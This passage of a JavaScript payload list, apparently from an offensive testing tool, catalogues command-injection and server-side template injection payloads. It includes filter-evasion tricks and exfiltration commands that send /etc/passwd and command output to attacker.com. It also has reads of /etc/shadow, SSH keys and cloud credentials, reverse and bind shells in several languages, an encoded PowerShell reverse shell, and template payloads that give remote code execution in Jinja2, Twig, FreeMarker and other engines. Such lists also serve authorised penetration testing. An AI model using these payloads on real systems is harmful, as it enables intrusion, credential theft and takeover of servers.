    { name: "Win double pipe", payload: '|| whoami', tag: "windows" },
    { name: "Win newline", payload: '%0awhoami', tag: "windows" },
    { name: "Win carriage return", payload: '%0dwhoami', tag: "windows" },

    // =================== SUBSHELL / EXECUTION TRICKS (UNIX) ===================
    { name: "Backticks", payload: '`id`', tag: "unix" },
    { name: "Backticks with command", payload: '`id`', tag: "unix" },
    { name: "Subshell $()", payload: '$(id)', tag: "unix" },
    { name: "Subshell $() with quotes", payload: '$(id)', tag: "unix" },
    { name: "Bash $((expression))", payload: '$((1+1))', tag: "unix" }, // not RCE but useful
    { name: "Inline shell execution", payload: '{id;}', tag: "unix" },
    { name: "Here string with bash", payload: 'bash<<<$(id)', tag: "unix" },

    // =================== SPACE BYPASSES (UNIX) ===================
    { name: "IFS variable (${IFS})", payload: 'cat${IFS}/etc/passwd', tag: "bypass" },
    { name: "IFS variable ($IFS)", payload: 'cat$IFS/etc/passwd', tag: "bypass" },
    { name: "Tab (URL encoded %09)", payload: 'cat%09/etc/passwd', tag: "bypass" },
    { name: "URL encoded space (%20)", payload: 'cat%20/etc/passwd', tag: "bypass" },
    { name: "Plus sign (+) for space", payload: 'cat+/etc/passwd', tag: "bypass" },
    { name: "Curly braces", payload: '{cat,/etc/passwd}', tag: "bypass" },
    { name: "Redirection for space", payload: 'cat<>/etc/passwd', tag: "bypass" },
    { name: "Newline as space (in some contexts)", payload: 'cat%0a/etc/passwd', tag: "bypass" },
    { name: "Xargs trick", payload: 'echo /etc/passwd | xargs cat', tag: "bypass" },

    // =================== QUOTING & CHARACTER BYPASSES ===================
    { name: "Single quotes (unix)", payload: "c'a't /etc/passwd", tag: "bypass" },
    { name: "Double quotes (unix)", payload: 'c"a"t /etc/passwd', tag: "bypass" },
    { name: "Backslash escape", payload: 'c\at /etc/passwd', tag: "bypass" },
    { name: "Single quotes around whole command", payload: "echo 'id' | bash", tag: "bypass" },
    { name: "Double quotes around whole command", payload: 'echo "id" | bash', tag: "bypass" },
    { name: "Wildcard globbing (any char)", payload: '/???/???t /etc/passwd', tag: "bypass" }, // /bin/cat
    { name: "Wildcard globbing (range)", payload: '/usr/bin/[c]at /etc/passwd', tag: "bypass" },
    { name: "Wildcard globbing (star)", payload: '/bin/ca* /etc/passwd', tag: "bypass" },
    { name: "Variable assignment bypass", payload: 'a=id;$a', tag: "bypass" },
    { name: "Variable concatenation", payload: 'a=c;b=at;$a$b /etc/passwd', tag: "bypass" },

    // =================== ENCODING / WAF BYPASSES ===================
    { name: "Base64 encoded command", payload: 'echo "aWQK" | base64 -d | bash', tag: "bypass" },
    { name: "Base64 encoded (whoami)", payload: 'echo "d2hvYW1pCg==" | base64 -d | bash', tag: "bypass" },
    { name: "Hex encoded command", payload: 'echo 69640a | xxd -r -p | bash', tag: "bypass" },
    { name: "Octal encoded", payload: 'echo "$(printf \\151\\144)"', tag: "bypass" },
    { name: "ROT13 encoded", payload: "echo 'vq' | tr 'a-z' 'n-za-m' | bash", tag: "bypass" },
    { name: "Reverse string execution", payload: "echo 'di' | rev | bash", tag: "bypass" },
    { name: "Case obfuscation", payload: 'CaT /etc/passwd', tag: "bypass" },
    { name: "Null byte injection", payload: 'cat%00 /etc/passwd', tag: "bypass" }, // may work in some C contexts

    // =================== BLIND DETECTION (TIME-BASED) ===================
    { name: "Sleep 5 seconds (unix)", payload: '; sleep 5', tag: "blind" },
    { name: "Sleep 10 seconds (unix)", payload: '; sleep 10', tag: "blind" },
    { name: "Sleep via ping (unix)", payload: '| ping -c 5 127.0.0.1', tag: "blind" },
    { name: "Sleep via timeout (unix)", payload: '&& timeout 5 sleep 10', tag: "blind" },
    { name: "Windows sleep (ping)", payload: '& ping -n 5 127.0.0.1', tag: "blind" },
    { name: "Windows sleep (timeout)", payload: '| timeout /t 5', tag: "blind" },
    { name: "Sleep via curl (unix)", payload: '; curl -m 5 http://127.0.0.1', tag: "blind" },
    { name: "Sleep via perl (unix)", payload: '; perl -e "sleep(10)"', tag: "blind" },
    { name: "Sleep via python (unix)", payload: '; python -c "import time;time.sleep(10)"', tag: "blind" },

    // =================== BLIND DETECTION (ERROR-BASED / OUTPUT-BASED) ===================
    { name: "Error-based (stderr redirect)", payload: '; id 2>&1', tag: "blind" },
    { name: "Error-based (invalid command)", payload: '; invalid_command', tag: "blind" },
    { name: "Output to temp file", payload: '; id > /tmp/output.txt', tag: "blind" },
    { name: "Windows output to temp", payload: '& whoami > C:\\temp\\output.txt', tag: "blind" },

    // =================== OUT-OF-BAND (DNS EXFILTRATION) ===================
    { name: "DNS OOB via nslookup", payload: '; nslookup $(whoami).attacker.com', tag: "oob" },
    { name: "DNS OOB via dig", payload: '; dig $(whoami).attacker.com', tag: "oob" },
    { name: "DNS OOB via ping (unix)", payload: '| ping -c 1 $(whoami).attacker.com', tag: "oob" },
    { name: "DNS OOB via ping (windows)", payload: '& ping -n 1 %USERNAME%.attacker.com', tag: "oob" },
    { name: "DNS OOB via host", payload: '; host $(whoami).attacker.com', tag: "oob" },
    { name: "DNS OOB via wget", payload: '; wget http://attacker.com/$(id)', tag: "oob" },

    // =================== OUT-OF-BAND (HTTP / HTTPS EXFILTRATION) ===================
    { name: "HTTP OOB via curl (whoami)", payload: '; curl http://attacker.com/$(whoami)', tag: "oob" },
    { name: "HTTP OOB via curl (id)", payload: '; curl http://attacker.com/$(id | base64)', tag: "oob" },
    { name: "HTTP OOB via wget", payload: '; wget --post-data=$(cat /etc/passwd) http://attacker.com/', tag: "oob" },
    { name: "HTTP OOB via lynx", payload: '; lynx http://attacker.com/$(whoami)', tag: "oob" },
    { name: "HTTP OOB via nc (netcat)", payload: '; nc attacker.com 80 -e /bin/sh', tag: "oob" },
    { name: "HTTP OOB via telnet", payload: '; telnet attacker.com 80 &', tag: "oob" },
    { name: "HTTPS OOB via curl", payload: '; curl https://attacker.com/$(whoami)', tag: "oob" },
    { name: "HTTP OOB via python", payload: '; python -c "import urllib2;urllib2.urlopen(\'http://attacker.com/\'+__import__(\'os\').popen(\'id\').read())"', tag: "oob" },

    // =================== FILE READ (LINUX) ===================
    { name: "Read /etc/passwd", payload: '; cat /etc/passwd', tag: "read-file" },
    { name: "Read /etc/shadow", payload: '| cat /etc/shadow', tag: "read-file" },
    { name: "Read /etc/hosts", payload: '&& cat /etc/hosts', tag: "read-file" },
    { name: "Read /etc/issue", payload: '; cat /etc/issue', tag: "read-file" },
    { name: "Read /etc/profile", payload: '; cat /etc/profile', tag: "read-file" },
    { name: "Read /root/.bash_history", payload: '; cat /root/.bash_history', tag: "read-file" },
    { name: "Read /root/.ssh/id_rsa", payload: '; cat /root/.ssh/id_rsa', tag: "read-file" },
    { name: "Read /root/.ssh/authorized_keys", payload: '; cat /root/.ssh/authorized_keys', tag: "read-file" },
    { name: "Read /root/.aws/credentials", payload: '; cat /root/.aws/credentials', tag: "read-file" },
    { name: "Read /proc/self/environ", payload: '; cat /proc/self/environ', tag: "read-file" },
    { name: "Read /proc/self/cmdline", payload: '; cat /proc/self/cmdline', tag: "read-file" },
    { name: "Read /proc/self/status", payload: '; cat /proc/self/status', tag: "read-file" },
    { name: "Read /proc/net/fib_trie (network info)", payload: '; cat /proc/net/fib_trie', tag: "read-file" },
    { name: "Read /proc/net/tcp (open ports)", payload: '; cat /proc/net/tcp', tag: "read-file" },
    { name: "Read /var/log/auth.log", payload: '; cat /var/log/auth.log', tag: "read-file" },
    { name: "Read /var/log/apache2/access.log", payload: '; cat /var/log/apache2/access.log', tag: "read-file" },
    { name: "Read /var/log/nginx/access.log", payload: '; cat /var/log/nginx/access.log', tag: "read-file" },
    { name: "Read /etc/nginx/nginx.conf", payload: '; cat /etc/nginx/nginx.conf', tag: "read-file" },
    { name: "Read /etc/apache2/apache2.conf", payload: '; cat /etc/apache2/apache2.conf', tag: "read-file" },
    { name: "Read /etc/mysql/my.cnf", payload: '; cat /etc/mysql/my.cnf', tag: "read-file" },
    { name: "Read /etc/redis/redis.conf", payload: '; cat /etc/redis/redis.conf', tag: "read-file" },
    { name: "Read /etc/kubernetes/admin.conf", payload: '; cat /etc/kubernetes/admin.conf', tag: "read-file" },
    { name: "Read /var/www/html/index.php", payload: '; cat /var/www/html/index.php', tag: "read-file" },
    { name: "Read /home/*/.bashrc", payload: '; cat /home/*/.bashrc', tag: "read-file" },

    // =================== FILE READ (WINDOWS) ===================
    { name: "Read win.ini (win)", payload: '& type C:\\windows\\win.ini', tag: "read-file" },
    { name: "Read boot.ini (win)", payload: '| type C:\\boot.ini', tag: "read-file" },
    { name: "Read Windows hosts", payload: '& type C:\\Windows\\System32\\drivers\\etc\\hosts', tag: "read-file" },
    { name: "Read web.config", payload: '& type C:\\inetpub\\wwwroot\\web.config', tag: "read-file" },
    { name: "Read appsettings.json", payload: '& type C:\\app\\appsettings.json', tag: "read-file" },
    { name: "List C drive (win)", payload: '& dir C:\\', tag: "read-file" },
    { name: "List Windows directory (win)", payload: '& dir C:\\Windows', tag: "read-file" },

    // =================== ENVIRONMENT & SYSTEM ENUMERATION ===================
    { name: "Whoami (unix)", payload: '; whoami', tag: "env" },
    { name: "Whoami (windows)", payload: '& whoami', tag: "env" },
    { name: "Print all env (unix)", payload: '; printenv', tag: "env" },
    { name: "Print all env (win)", payload: '& set', tag: "env" },
    { name: "Print env (unix)", payload: '; env', tag: "env" },
    { name: "Hostname (unix)", payload: '; hostname', tag: "env" },
    { name: "Hostname (win)", payload: '& hostname', tag: "env" },
    { name: "List processes (unix)", payload: '; ps aux', tag: "env" },
    { name: "List processes (win)", payload: '& tasklist', tag: "env" },
    { name: "Kernel version (unix)", payload: '; uname -a', tag: "env" },
    { name: "Kernel version (win)", payload: '& systeminfo', tag: "env" },
    { name: "Current directory (unix)", payload: '; pwd', tag: "env" },
    { name: "Current directory (win)", payload: '& cd', tag: "env" },
    { name: "List directory contents (unix)", payload: '; ls -la', tag: "env" },
    { name: "List directory contents (win)", payload: '& dir', tag: "env" },
    { name: "Id command (unix)", payload: '; id', tag: "env" },
    { name: "Uname -m (arch)", payload: '; uname -m', tag: "env" },
    { name: "Get shell type", payload: '; echo $SHELL', tag: "env" },

    // =================== REVERSE SHELLS (BASH) ===================
    { name: "Bash reverse shell (TCP)", payload: '; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1', tag: "rce" },
    { name: "Bash reverse shell (UDP)", payload: '; bash -i >& /dev/udp/127.0.0.1/4444 0>&1', tag: "rce" },
    { name: "Bash exec reverse", payload: '; exec 5<>/dev/tcp/127.0.0.1/4444;cat <&5|while read line; do $line 2>&5 >&5; done', tag: "rce" },
    { name: "Bash 0<&196 reverse", payload: '; 0<&196;exec 196<>/dev/tcp/127.0.0.1/4444; sh <&196 >&196 2>&196', tag: "rce" },

    // =================== REVERSE SHELLS (NETCAT / NC) ===================
    { name: "Netcat reverse (traditional)", payload: '; nc -e /bin/sh 127.0.0.1 4444', tag: "rce" },
    { name: "Netcat reverse (OpenBSD)", payload: '; nc -c /bin/sh 127.0.0.1 4444', tag: "rce" },
    { name: "Netcat reverse (without -e)", payload: '; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f', tag: "rce" },
    { name: "Netcat reverse (windows)", payload: '& nc.exe -e cmd.exe 127.0.0.1 4444', tag: "rce" },

    // =================== REVERSE SHELLS (PYTHON) ===================
    { name: "Python reverse shell (3)", payload: '; python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'127.0.0.1\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"', tag: "rce" },
    { name: "Python reverse shell (2)", payload: '; python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'127.0.0.1\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"', tag: "rce" },
    { name: "Python one-liner reverse", payload: '; python -c "import pty;pty.spawn(\'/bin/sh\')"', tag: "rce" },

    // =================== REVERSE SHELLS (PERL) ===================
    { name: "Perl reverse shell", payload: '; perl -e \'use Socket;$i="127.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'', tag: "rce" },

    // =================== REVERSE SHELLS (RUBY) ===================
    { name: "Ruby reverse shell", payload: '; ruby -rsocket -e \'f=TCPSocket.open("127.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'', tag: "rce" },

    // =================== REVERSE SHELLS (PHP) ===================
    { name: "PHP reverse shell", payload: '; php -r \'$sock=fsockopen("127.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'', tag: "rce" },

    // =================== BIND SHELLS (LISTENING) ===================
    { name: "Netcat bind shell (unix)", payload: '; nc -lvp 4444 -e /bin/sh', tag: "rce" },
    { name: "Netcat bind shell (windows)", payload: '& nc.exe -lvp 4444 -e cmd.exe', tag: "rce" },
    { name: "Bash bind shell", payload: '; nc -lvp 4444 -e /bin/sh', tag: "rce" },
    { name: "Python bind shell", payload: '; python -c "import socket,subprocess,os;s=socket.socket();s.bind((\'0.0.0.0\',4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"', tag: "rce" },

    // =================== COMMAND CHAINING WITH ENCODED PAYLOADS ===================
    { name: "Base64 encoded reverse shell (bash)", payload: '; echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx" | base64 -d | bash', tag: "rce" },
    { name: "Base64 encoded whoami (unix)", payload: '; echo "d2hvYW1p" | base64 -d | bash', tag: "bypass" },
    { name: "Base64 encoded whoami (win via powershell)", payload: '& powershell -e dABpAGUAbQBlAHIAIAA2ADUAIAAiAEkAbgBqAGUAYwB0AGkAbwBuACIA', tag: "windows" },

    // =================== POWERSHELL (WINDOWS) ===================
    { name: "PowerShell whoami", payload: '& powershell -c whoami', tag: "windows" },
    { name: "PowerShell download cradle", payload: '& powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com/rev.ps1\')"', tag: "rce" },
    { name: "PowerShell encoded command", payload: '& powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAoACIAMQAyADcALgAwAC4AMAAuADEAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA', tag: "rce" }, // Base64 encoded reverse shell

    // =================== FILE WRITE / UPLOAD (RCE PREP) ===================
    { name: "Write PHP shell (unix)", payload: '; echo "<?php system($_GET[\'cmd\']); ?>" > /var/www/html/shell.php', tag: "rce" },
    { name: "Write webshell (windows)", payload: '& echo ^<?php system($_GET["cmd"]); ?^> > C:\\inetpub\\wwwroot\\shell.php', tag: "rce" },
    { name: "Download file via wget", payload: '; wget http://attacker.com/shell.php -O /var/www/html/shell.php', tag: "rce" },
    { name: "Download file via curl", payload: '; curl http://attacker.com/shell.php -o /tmp/shell.php', tag: "rce" },
    { name: "Download via powershell (win)", payload: '& powershell -c "Invoke-WebRequest -Uri http://attacker.com/rev.ps1 -OutFile C:\\temp\\rev.ps1"', tag: "rce" },

    // =================== SSRF / PORT SCANNING VIA COMMAND INJECTION ===================
    { name: "Ping scan internal (unix)", payload: '; ping -c 1 192.168.1.1', tag: "blind" },
    { name: "Curl localhost (unix)", payload: '; curl http://127.0.0.1:8080', tag: "oob" },
    { name: "Nmap scan (if installed)", payload: '; nmap -p 80,443 127.0.0.1', tag: "env" },

    // =================== MULTI-COMMAND CHAINS ===================
    { name: "Chain whoami and id (unix)", payload: '; whoami; id', tag: "unix" },
    { name: "Chain whoami and hostname (win)", payload: '& whoami & hostname', tag: "windows" },
    { name: "Chain with conditional (unix)", payload: '&& whoami && id', tag: "unix" },

    // =================== MISC TRICKS ===================
    { name: "Command substitution with curl to exfil (unix)", payload: '; curl http://attacker.com/$(cat /etc/passwd | base64 | tr -d \'\n\')', tag: "oob" },
    { name: "Command substitution with ping DNS (unix)", payload: '; ping -c 1 $(whoami | md5sum).attacker.com', tag: "oob" },
    { name: "Tr -d to remove newline (unix)", payload: '; cat /etc/passwd | tr -d "\n" | curl --data-binary @- http://attacker.com/', tag: "oob" },
    { name: "Using awk to execute (unix)", payload: '; awk "BEGIN{system(\"id\")}"', tag: "unix" },
    { name: "Using sed to execute (unix)", payload: '; sed -n "s/.*/id/e" /etc/hosts', tag: "unix" }, // GNU sed e flag
    { name: "Using find to execute (unix)", payload: '; find / -name "passwd" -exec id \\;', tag: "unix" },
    { name: "Using xargs to execute (unix)", payload: '; echo "id" | xargs bash -c', tag: "unix" },
    { name: "Using grep to execute (unix)", payload: '; grep -e ".*" /etc/passwd -exec id \\;', tag: "unix" }, // GNU grep
    { name: "Using tar to execute (unix)", payload: '; tar -cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=id', tag: "unix" }
  ],

  // ===== SSTI =====
  SSTI: [
    // ---------- DETECTION / IDENTIFICATION ----------
    { name: "Probe polyglot (Tplmap-style)", payload: "${{<%[%'\"}}%", tag: "detect" },
    { name: "Detect {{7*7}} → 49", payload: "{{7*7}}", tag: "detect" },
    { name: "Detect ${7*7} → 49", payload: "${7*7}", tag: "detect" },
    { name: "Detect <%= 7*7 %> → 49 (ERB/EJS)", payload: "<%= 7*7 %>", tag: "detect" },
    { name: "Detect #{7*7} → 49 (Ruby/Smarty)", payload: "#{7*7}", tag: "detect" },
    { name: "Detect *{7*7} → 49 (Spring EL)", payload: "*{7*7}", tag: "detect" },
    { name: "Detect [[${7*7}]] → 49 (Thymeleaf)", payload: "[[${7*7}]]", tag: "detect" },
    { name: "Detect {{=7*7}} → 49 (doT.js)", payload: "{{=7*7}}", tag: "detect" },
    { name: "Detect #set($x=7*7)$x → 49 (Velocity)", payload: "#set($x=7*7)$x", tag: "detect" },
    { name: "Diff {{7*'7'}} (Jinja2→7777777, Twig→49)", payload: "{{7*'7'}}", tag: "detect" },

    // ---------- JINJA2 / FLASK (Python) ----------
    { name: "Jinja2 config dump", payload: "{{config}}", tag: "jinja2" },
    { name: "Jinja2 config items", payload: "{{config.items()}}", tag: "jinja2" },
    { name: "Jinja2 SECRET_KEY", payload: "{{config['SECRET_KEY']}}", tag: "jinja2" },
    { name: "Jinja2 request environ", payload: "{{request.environ}}", tag: "jinja2" },
    { name: "Jinja2 request application", payload: "{{request.application}}", tag: "jinja2" },
    { name: "Jinja2 globals via self", payload: "{{self.__init__.__globals__}}", tag: "jinja2" },
    { name: "Jinja2 subclasses list", payload: "{{''.__class__.__mro__[1].__subclasses__()}}", tag: "jinja2" },
    { name: "Jinja2 RCE via subclasses (set INDEX)", payload: "{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}", tag: "jinja2" },
    { name: "Jinja2 RCE via os (subclasses)", payload: "{{''.__class__.__bases__[0].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read()}}", tag: "jinja2" },
    { name: "Jinja2 RCE via cycler", payload: "{{cycler.__init__.__globals__.os.popen('id').read()}}", tag: "jinja2" },
    { name: "Jinja2 RCE via joiner", payload: "{{joiner.__init__.__globals__.os.popen('id').read()}}", tag: "jinja2" },
    { name: "Jinja2 RCE via lipsum", payload: "{{lipsum.__globals__['os'].popen('id').read()}}", tag: "jinja2" },
    { name: "Jinja2 RCE via namespace", payload: "{{namespace.__init__.__globals__.os.popen('id').read()}}", tag: "jinja2" },
    { name: "Jinja2 RCE via url_for", payload: "{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}", tag: "jinja2" },
    { name: "Jinja2 RCE via get_flashed_messages", payload: "{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}", tag: "jinja2" },
    { name: "Jinja2 RCE via config globals", payload: "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}", tag: "jinja2" },
    { name: "Jinja2 RCE attr-filter bypass", payload: "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}", tag: "jinja2" },
    { name: "Jinja2 RCE bracket-notation bypass", payload: "{{request[\"application\"][\"__globals__\"][\"__builtins__\"][\"__import__\"](\"os\")[\"popen\"](\"id\")[\"read\"]()}}", tag: "jinja2" },
    { name: "Jinja2 file read /etc/passwd", payload: "{{self.__init__.__globals__.__builtins__.open('/etc/passwd').read()}}", tag: "jinja2" },
    { name: "Jinja2 file read via popen", payload: "{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}", tag: "jinja2" },

    // ---------- TWIG (PHP / Symfony) ----------
    { name: "Twig 7*'7' → 49", payload: "{{7*'7'}}", tag: "twig" },
    { name: "Twig dump server vars", payload: "{{app.request.server.all|join(',')}}", tag: "twig" },
    { name: "Twig SERVER_NAME", payload: "{{app.request.server.get('SERVER_NAME')}}", tag: "twig" },
    { name: "Twig app user", payload: "{{app.user.username}}", tag: "twig" },
    { name: "Twig app secret", payload: "{{app.secret}}", tag: "twig" },
    { name: "Twig file_excerpt read", payload: "{{'/etc/passwd'|file_excerpt(0,100)}}", tag: "twig" },
    { name: "Twig RCE undefined filter (exec)", payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", tag: "twig" },
    { name: "Twig RCE undefined filter (system)", payload: "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}", tag: "twig" },
    { name: "Twig RCE filter(system)", payload: "{{['id']|filter('system')}}", tag: "twig" },
    { name: "Twig RCE map(system)", payload: "{{['id']|map('system')}}", tag: "twig" },
    { name: "Twig RCE map(shell_exec)", payload: "{{['id']|map('shell_exec')}}", tag: "twig" },

    // ---------- FREEMARKER (Java) ----------
    { name: "FreeMarker ${7*7}", payload: "${7*7}", tag: "freemarker" },
    { name: "FreeMarker assign+eval", payload: "<#assign x=7*7>${x}", tag: "freemarker" },
    { name: "FreeMarker RCE Execute", payload: '${"freemarker.template.utility.Execute"?new()("id")}', tag: "freemarker" },
    { name: "FreeMarker RCE Execute (assign)", payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', tag: "freemarker" },
    { name: "FreeMarker RCE ProcessBuilder", payload: '${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder",["id"]).start()}', tag: "freemarker" },
    { name: "FreeMarker RCE JythonRuntime", payload: '<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>id</@value>', tag: "freemarker" },

    // ---------- VELOCITY (Java) ----------
    { name: "Velocity eval", payload: "#set($x=7*7)$x", tag: "velocity" },
    { name: "Velocity RCE class.inspect", payload: '$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")', tag: "velocity" },
    { name: "Velocity RCE class.inspect (set)", payload: '#set($e=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$e.waitFor()', tag: "velocity" },
    { name: "Velocity RCE reflection", payload: "#set($e=\"exp\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".getClass()).invoke($e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"id\")", tag: "velocity" },

    // ---------- SMARTY (PHP) ----------
    { name: "Smarty version", payload: "{$smarty.version}", tag: "smarty" },
    { name: "Smarty {if} system", payload: "{if system('id')}{/if}", tag: "smarty" },
    { name: "Smarty {if} exec", payload: "{if exec('id')}{/if}", tag: "smarty" },
    { name: "Smarty {if} shell_exec", payload: "{if shell_exec('id')}{/if}", tag: "smarty" },
    { name: "Smarty {if} passthru", payload: "{if passthru('id')}{/if}", tag: "smarty" },
    { name: "Smarty {php} system (legacy)", payload: "{php}system('id');{/php}", tag: "smarty" },
    { name: "Smarty write webshell", payload: `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",true)}`, tag: "smarty" },

    // ---------- MAKO (Python) ----------
    { name: "Mako ${7*7}", payload: "${7*7}", tag: "mako" },
    { name: "Mako RCE import os", payload: '${__import__("os").popen("id").read()}', tag: "mako" },
    { name: "Mako RCE cache util", payload: "${self.module.cache.util.os.system('id')}", tag: "mako" },
    { name: "Mako RCE block import", payload: "<% x=__import__('os').popen('id').read() %>${x}", tag: "mako" },

    // ---------- ERB (Ruby) ----------
    { name: "ERB eval", payload: "<%= 7*7 %>", tag: "erb" },
    { name: "ERB RCE system", payload: '<%= system("id") %>', tag: "erb" },
    { name: "ERB RCE backticks", payload: "<%= `id` %>", tag: "erb" },
    { name: "ERB RCE IO.popen", payload: "<%= IO.popen('id').readlines.first %>", tag: "erb" },
    { name: "ERB file read", payload: "<%= File.read('/etc/passwd') %>", tag: "erb" },

    // ---------- EJS (Node) ----------
    { name: "EJS eval (escaped)", payload: "<%= 7*7 %>", tag: "ejs" },
    { name: "EJS eval (unescaped)", payload: "<%- 7*7 %>", tag: "ejs" },
    { name: "EJS RCE mainModule", payload: "<%= global.process.mainModule.require('child_process').execSync('id') %>", tag: "ejs" },
    { name: "EJS RCE mainModule (unescaped)", payload: "<%- global.process.mainModule.require('child_process').execSync('id') %>", tag: "ejs" },

    // ---------- PUG / JADE (Node) ----------
    { name: "Pug eval", payload: "#{7*7}", tag: "pug" },
    { name: "Pug RCE interpolation", payload: "#{global.process.mainModule.require('child_process').execSync('id')}", tag: "pug" },
    { name: "Pug RCE code line", payload: "- global.process.mainModule.require('child_process').execSync('id')", tag: "pug" },

    // ---------- DOT.JS (Node) ----------
    { name: "doT.js eval", payload: "{{=7*7}}", tag: "dot" },
    { name: "doT.js RCE mainModule", payload: "{{=global.process.mainModule.require('child_process').execSync('id')}}", tag: "dot" },

    // ---------- HANDLEBARS (Node) ----------
    { name: "Handlebars eval", payload: "{{7*7}}", tag: "handlebars" },
    { name: "Handlebars RCE constructor", payload: "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}", tag: "handlebars" },
    { name: "Handlebars RCE lookup chain", payload: `{{#with "s" as |str|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id')"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}`, tag: "handlebars" },

    // ---------- PEBBLE (Java) ----------
    { name: "Pebble eval", payload: "{{7*7}}", tag: "pebble" },
    { name: "Pebble RCE getClass (legacy)", payload: "{% set cmd = 'id' %}{% set bytes = (1).getClass().forName('java.lang.Runtime').getMethod('exec', (''.getClass())).invoke((1).getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null), cmd) %}{{bytes}}", tag: "pebble" },

    // ---------- THYMELEAF (Java / Spring) ----------
    { name: "Thymeleaf inline eval", payload: "[[${7*7}]]", tag: "thymeleaf" },
    { name: "Thymeleaf select eval", payload: "*{7*7}", tag: "thymeleaf" },
    { name: "Thymeleaf RCE preprocessing", payload: "__${T(java.lang.Runtime).getRuntime().exec('id')}__", tag: "thymeleaf" },
    { name: "Thymeleaf RCE preprocessing .x", payload: "__${T(java.lang.Runtime).getRuntime().exec('id')}__.x", tag: "thymeleaf" },
